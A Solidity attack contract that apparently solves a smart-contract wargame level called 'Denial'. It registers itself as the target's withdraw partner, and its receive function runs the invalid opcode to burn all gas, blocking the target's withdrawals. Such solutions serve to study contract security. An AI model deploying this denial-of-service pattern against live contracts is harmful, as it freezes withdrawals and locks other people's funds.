// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Denial} from "./Denial.sol";

contract DenialHack {
    Denial private immutable target;

    constructor(address payable _target) {
        target = Denial(_target);
        target.setWithdrawPartner(address(this));
    }

    receive() external payable {
        assembly {
            invalid()
        }
    }
}
